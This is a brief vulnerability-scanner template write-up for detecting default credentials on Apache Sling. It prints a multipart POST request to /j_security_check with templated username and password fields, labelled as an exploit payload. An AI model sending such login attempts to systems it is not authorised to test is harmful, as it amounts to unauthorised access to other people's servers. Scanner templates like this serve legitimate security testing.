# Nuclei Template: Apache Sling - Default Login
**Template ID:** apache-sling-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-sling-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Sling default login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCQeiTztQvBDyNxA

------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="_charset_"

UTF-8
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="resource"

/
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="j_username"

{{username}}
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="j_password"

{{password}}
------WebKitFormBoundaryBCQeiTztQvBDyNxA--
```

## References
- https://github.com/apache/sling
